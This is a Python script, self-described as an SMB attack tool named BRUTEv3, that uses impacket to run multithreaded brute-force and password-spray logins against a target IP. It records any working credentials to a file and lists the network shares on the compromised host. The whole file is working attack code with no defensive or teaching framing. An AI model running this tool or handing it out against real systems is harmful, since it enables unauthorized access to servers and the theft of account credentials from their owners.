#!/usr/bin/env python3

import sys
import argparse
from datetime import datetime
from impacket.smbconnection import SMBConnection
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Global variable for thread count
THREADS = 5

# Save successful login cleanly
def save_success(username, password, target_ip, mode):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open("successful_logins.txt", "a") as success_log:
        success_log.write(f"[{timestamp}] [{mode}] {target_ip} | Username: {username} | Password: {password}\n")

# Banner
def print_banner():
    lines = [
        " ____  _____  _    _ _______ ______ ",
        "|  _ \\|  __ \\| |  | |__   __|  ____|",
        "| |_) | |__) | |  | |  | |  | |__   ",
        "|  _ <|  _  /| |  | |  | |  |  __|  ",
        "| |_) | | \\ \\| |__| |  | |  | |____ ",
        "|____/|_|  \\\\____/   |_|  |______|"
    ]
    for line in lines:
        print(GREEN + line.center(80) + RESET)
    print()
    print(f"{YELLOW}{'0dayjay SMB Attack Tool V3'.center(80)}{RESET}\n")

# Argument Parser
def parse_args():
    global THREADS
    parser = argparse.ArgumentParser(description="BRUTEv3 - SMB Attack Tool by 0dayjay")
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default 5)')
    args = parser.parse_args()
    THREADS = args.threads

# Menu
def main_menu():
    print_banner()
    print(YELLOW + "[1] Classic Bruteforce (1 username, many passwords)" + RESET)
    print(YELLOW + "[2] Username Spray (many usernames, 1 password)" + RESET)
    print(YELLOW + "[3] Password Spray (1 username, many passwords)" + RESET)
    print(YELLOW + "[4] Full Spray (userlist + wordlist)" + RESET)
    print(YELLOW + "[5] Exit" + RESET)
    print()

    choice = input(f"{GREEN}Select an option: {RESET}")

    if choice == '1':
        classic_bruteforce()
    elif choice == '2':
        username_spray()
    elif choice == '3':
        password_spray()
    elif choice == '4':
        full_spray()
    elif choice == '5':
        print(RED + "\nExiting BRUTEv3... Goodbye, Operator 0dayjay!" + RESET)
        sys.exit(0)
    else:
        print(RED + "\nInvalid choice. Try again.\n" + RESET)
        main_menu()

# Attack Modes
def classic_bruteforce():
    print(GREEN + "\n[+] Classic Bruteforce Mode Selected\n" + RESET)

    target_ip = input("Enter target IP Address: ").strip()
    username = input("Enter username: ").strip()
    wordlist_path = input("Enter path to your password list: ").strip()

    thread_count = THREADS

    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(RED + "\n[-] Wordlist not found. Check the path and try again.\n" + RESET)
        sys.exit()

    print(YELLOW + f"\n[+] Starting bruteforce against {username}@{target_ip} with {len(passwords)} passwords using {thread_count} threads...\n" + RESET)

    def attempt_login(password):
        try:
            conn = SMBConnection(remoteName=target_ip, remoteHost=target_ip)
            conn.login(username, password)

            print(GREEN + f"\n[+] SUCCESS! Password found: {password}" + RESET)
            save_success(username, password, target_ip, "Classic Bruteforce")

            shares = conn.listShares()
            print(YELLOW + f"\n[+] Shares available on {target_ip}:{RESET}")
            for share in shares:
                print(f"    {share['shi1_netname'][:-1]}")

            conn.close()
            sys.exit(0)

        except Exception as e:
            with open("attempt_log.txt", "a") as fail_log:
                fail_log.write(f"Attempt: {username}:{password} - Failed - {str(e)}\n")
            print(RED + f"[!] Failed login with {password}" + RESET)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(attempt_login, password): password for password in passwords}
        for future in as_completed(futures):
            pass

    print(RED + "\n[-] Bruteforce complete. Password not found.\n" + RESET)
    sys.exit()

def username_spray():
    print(GREEN + "\n[+] Username Spray Mode Selected\n" + RESET)

    target_ip = input("Enter target IP Address: ").strip()
    userlist_path = input("Enter path to your username list: ").strip()
    password = input("Enter the password to spray: ").strip()

    thread_count = THREADS

    try:
        with open(userlist_path, 'r') as file:
            usernames = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(RED + "\n[-] Username list not found. Check the path and try again.\n" + RESET)
        sys.exit()

    print(YELLOW + f"\n[+] Starting username spray against {target_ip} with {len(usernames)} usernames using {thread_count} threads...\n" + RESET)

    def attempt_login(username):
        try:
            conn = SMBConnection(remoteName=target_ip, remoteHost=target_ip)
            conn.login(username, password)

            print(GREEN + f"\n[+] SUCCESS! {username}:{password}" + RESET)
            save_success(username, password, target_ip, "Username Spray")

            shares = conn.listShares()
            print(YELLOW + f"\n[+] Shares available on {target_ip}:{RESET}")
            for share in shares:
                print(f"    {share['shi1_netname'][:-1]}")

            conn.close()
            sys.exit(0)

        except Exception as e:
            with open("attempt_log.txt", "a") as fail_log:
                fail_log.write(f"Attempt: {username}:{password} - Failed - {str(e)}\n")
            print(RED + f"[!] Failed login with {username}" + RESET)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(attempt_login, username): username for username in usernames}
        for future in as_completed(futures):
            pass

    print(RED + "\n[-] Username spray complete. No successful logins.\n" + RESET)
    sys.exit()

def password_spray():
    print(GREEN + "\n[+] Password Spray Mode Selected\n" + RESET)

    target_ip = input("Enter target IP Address: ").strip()
    username = input("Enter username: ").strip()
    wordlist_path = input("Enter path to your password list: ").strip()

    thread_count = THREADS

    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(RED + "\n[-] Password list not found. Check the path and try again.\n" + RESET)
        sys.exit()

    print(YELLOW + f"\n[+] Starting password spray against {username}@{target_ip} with {len(passwords)} passwords using {thread_count} threads...\n" + RESET)

    def attempt_login(password):
        try:
            conn = SMBConnection(remoteName=target_ip, remoteHost=target_ip)
            conn.login(username, password)

            print(GREEN + f"\n[+] SUCCESS! {username}:{password}" + RESET)
            save_success(username, password, target_ip, "Password Spray")

            shares = conn.listShares()
            print(YELLOW + f"\n[+] Shares available on {target_ip}:{RESET}")
            for share in shares:
                print(f"    {share['shi1_netname'][:-1]}")

            conn.close()
            sys.exit(0)

        except Exception as e:
            with open("attempt_log.txt", "a") as fail_log:
                fail_log.write(f"Attempt: {username}:{password} - Failed - {str(e)}\n")
            print(RED + f"[!] Failed login with {password}" + RESET)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(attempt_login, password): password for password in passwords}
        for future in as_completed(futures):
            pass

    print(RED + "\n[-] Password spray complete. No successful logins.\n" + RESET)
    sys.exit()

def full_spray():
    print(GREEN + "\n[+] Full Spray Mode Selected\n" + RESET)

    target_ip = input("Enter target IP Address: ").strip()
    userlist_path = input("Enter path to your username list: ").strip()
    wordlist_path = input("Enter path to your password list: ").strip()

    thread_count = THREADS

    try:
        with open(userlist_path, 'r') as userfile:
            usernames = [line.strip() for line in userfile.readlines()]
        with open(wordlist_path, 'r') as passfile:
            passwords = [line.strip() for line in passfile.readlines()]
    except FileNotFoundError:
        print(RED + "\n[-] Username or password list not found. Check the paths and try again.\n" + RESET)
        sys.exit()

    print(YELLOW + f"\n[+] Starting full spray against {target_ip} with {len(usernames)} usernames and {len(passwords)} passwords using {thread_count} threads...\n" + RESET)

    def attempt_login(username, password):
        try:
            conn = SMBConnection(remoteName=target_ip, remoteHost=target_ip)
            conn.login(username, password)

            print(GREEN + f"\n[+] SUCCESS! {username}:{password}" + RESET)
            save_success(username, password, target_ip, "Full Spray")

            shares = conn.listShares()
            print(YELLOW + f"\n[+] Shares available on {target_ip}:{RESET}")
            for share in shares:
                print(f"    {share['shi1_netname'][:-1]}")

            conn.close()
            sys.exit(0)

        except Exception as e:
            with open("attempt_log.txt", "a") as fail_log:
                fail_log.write(f"Attempt: {username}:{password} - Failed - {str(e)}\n")
            print(RED + f"[!] Failed login with {username}:{password}" + RESET)

    for password in passwords:
        print(YELLOW + f"\n[+] Spraying password: {password}\n" + RESET)
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {executor.submit(attempt_login, username, password): username for username in usernames}
            for future in as_completed(futures):
                pass

    print(RED + "\n[-] Full spray complete. No successful logins.\n" + RESET)
    sys.exit()

if __name__ == "__main__":
    parse_args()
    main_menu()
